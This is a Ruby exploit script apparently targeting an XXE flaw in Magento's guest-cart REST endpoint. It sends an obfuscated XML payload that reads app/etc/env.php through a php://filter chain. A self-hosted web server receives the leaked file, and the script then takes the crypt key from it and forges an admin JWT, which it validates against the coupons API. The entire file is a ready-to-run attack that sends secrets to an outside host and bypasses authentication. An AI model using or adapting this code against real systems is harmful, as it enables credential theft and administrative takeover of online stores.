#!/usr/bin/env ruby -W0
# frozen_string_literal: true

require 'bundler'
Bundler.require(:default)

DEBUG_MODE = false
PROXY_ENABLED = false
PROXY_ADDRESS = '127.0.0.1'
PROXY_PORT = 8080

def debug(message)
  puts message.inspect if DEBUG_MODE
end

def generate_random_text(length = 8)
  characters = [('a'..'z'), ('A'..'Z')].flat_map(&:to_a)
  Array.new(length) { characters.sample }.join
end

def dtd_parameter_name
  @dtd_parameter_name ||= generate_random_text
end

def entity_eval
  @entity_eval ||= generate_random_text
end

def leak_parameter_name
  @leak_parameter_name ||= generate_random_text
end

def server_address
  @server_address ||= "http://#{@server_host.host}:#{@server_host.port}"
end

def http_client
  @http_client ||= begin
    client = if PROXY_ENABLED
               Net::HTTP.new(@target_uri.host, @target_uri.port, PROXY_ADDRESS, PROXY_PORT)
             else
               Net::HTTP.new(@target_uri.host, @target_uri.port)
             end

    if @target_uri.port == 443 || @target_uri.to_s.match?(/http(s).*/)
      client.use_ssl = true
      client.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    client.set_debug_output($stderr) if DEBUG_MODE
    client
  end
end

def create_xxe_dtd
  filter_path = 'php://filter/convert.base64-encode/resource=../app/etc/env.php'
  entity_file = generate_random_text
  %(
    <!ENTITY % #{entity_file} SYSTEM "#{filter_path}">
    <!ENTITY % #{dtd_parameter_name} "<!ENTITY #{entity_eval} SYSTEM '#{server_address}/?#{leak_parameter_name}=%#{entity_file};'>">
  )
end

def generate_xxe_xml
  parameter_entity_name = generate_random_text

  xml = "<?xml version='1.0' ?>"
  xml += "<!DOCTYPE #{generate_random_text}"
  xml += '['
  xml += "  <!ELEMENT #{generate_random_text} ANY >"
  xml += "    <!ENTITY % #{parameter_entity_name} SYSTEM '#{server_address}/#{generate_random_text}.dtd'> %#{parameter_entity_name}; %#{dtd_parameter_name}; "
  xml += ']'
  xml += "> <r>&#{entity_eval};</r>"

  xml
end

LIBXML_NOENT = 2
LIBXML_PARSEHUGE = 524_288

def send_xxe_request
  debug('Sending XXE request')

  signature = generate_random_text.capitalize

  post_data = {
    address: {
      signature => generate_random_text,
      totalsCollector: {
        collectorList: {
          totalCollector: {
            "\u0073\u006F\u0075\u0072\u0063\u0065\u0044\u0061\u0074\u0061" => {
              data: generate_xxe_xml,
              options: LIBXML_NOENT | LIBXML_PARSEHUGE
            }
          }
        }
      }
    }
  }.to_json

  request = Net::HTTP::Post.new('/rest/V1/guest-carts/1/estimate-shipping-methods')
  request.body = post_data
  request.content_type = 'application/json'
  response = http_client.request(request)

  raise 'Server returned unexpected response' unless response&.code == '400'

  response_body = JSON.parse(response.body)

  raise 'Server returned unexpected response' unless response_body['parameters']['fieldName'] == signature
end

TARGET_USER_ID = 1

USER_TYPE_INTEGRATION = 1
USER_TYPE_ADMIN = 2
USER_TYPE_CUSTOMER = 3
USER_TYPE_GUEST = 4

def encode_jwt(key, algorithm = 'HS256')
  pad_key = lambda do |total_length, pad_char|
    left_padding = (total_length - key.length) / 2
    right_padding = total_length - key.length - left_padding
    pad_char * left_padding + key + pad_char * right_padding
  end

  base64_url_encode = lambda do |str|
    Base64.urlsafe_encode64(str).tr('=', '')
  end

  header = {
    kid: '1',
    alg: algorithm
  }

  payload = {
    uid: TARGET_USER_ID,
    utypid: USER_TYPE_ADMIN,
    iat: Time.now.to_i,
    exp: Time.now.to_i + 10 * 24 * 60 * 60
  }

  padded_key = pad_key.call(2048, '&')

  encoded_header = base64_url_encode.call(header.to_json)
  encoded_payload = base64_url_encode.call(payload.to_json)

  data = "#{encoded_header}.#{encoded_payload}"
  signature = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), padded_key, data)
  encoded_signature = base64_url_encode.call(signature)

  "#{encoded_header}.#{encoded_payload}.#{encoded_signature}"
end

def start_web_server(file_content_writer_pipe, file_content_reader_pipe)
  puts 'Starting web server...'

  WEBrick::HTTPRequest.const_set('MAX_URI_LENGTH', 10_240)

  options = {
    BindAddress: '0.0.0.0',
    Port: @server_host.port,
    Logger: DEBUG_MODE ? WEBrick::Log.new($stderr, WEBrick::Log::DEBUG) : WEBrick::Log.new('/dev/null'),
    AccessLog: []
  }

  dtd_body = create_xxe_dtd

  Process.fork do
    file_content_reader_pipe.close

    server = WEBrick::HTTPServer.new(options)
    server.mount_proc '/' do |req, res|
      res.body = 'OK'
      if req.path =~ /\.dtd$/
        res.body = dtd_body
      elsif req.query_string.match(/#{leak_parameter_name}=(.*)/)
        file_content = Base64.decode64(Regexp.last_match(1))
        file_content_writer_pipe.puts file_content
      end
    end

    trap('INT') do
      server.shutdown
      file_content_writer_pipe.close
    end

    server.start
  end
end

def jwt_valid?(jwt)
  request = Net::HTTP::Get.new('/rest/default/V1/coupons/search?searchCriteria=', 'Authorization' => "Bearer #{jwt}")
  response = http_client.request(request)

  response&.code == '200'

  # puts 'Available coupons:'
  # puts JSON.pretty_generate(JSON.parse(response.body))
end

def read_file_content(file_content_reader_pipe)
  file_content = nil

  begin
    Timeout.timeout(5) do
      file_content = file_content_reader_pipe.read_nonblock(10_000)
    end
  rescue Timeout::Error
    puts 'Reading from pipe timed out.'
  rescue EOFError
    puts 'End of file reached.'
  ensure
    file_content_reader_pipe.close
  end

  file_content
end

def exploit
  file_content_reader_pipe, file_content_writer_pipe = IO.pipe

  server_pid = start_web_server(file_content_writer_pipe, file_content_reader_pipe)

  sleep(1)
  send_xxe_request
  file_content_writer_pipe.close

  file_content = read_file_content(file_content_reader_pipe)

  raise 'Failed to read file content' unless file_content

  key = file_content.match(/'key' => '(.*)'/)[1]

  raise 'Failed to extract key from file content' unless key

  jwt = encode_jwt(key)

  raise 'Exploit failed' unless jwt_valid?(jwt)

  puts 'Successfully authenticated'
  puts "JWT: #{jwt}"

  puts 'Exploit completed'
rescue RuntimeError => e
  puts "#{e.class} - #{e.message}"
ensure
  if server_pid
    Process.kill('INT', server_pid)
    Process.wait(server_pid)
  end
end

if __FILE__ == $PROGRAM_NAME
  @target_uri = URI.parse(ARGV[0])
  @server_host = URI.parse(ARGV[1])

  exploit
end
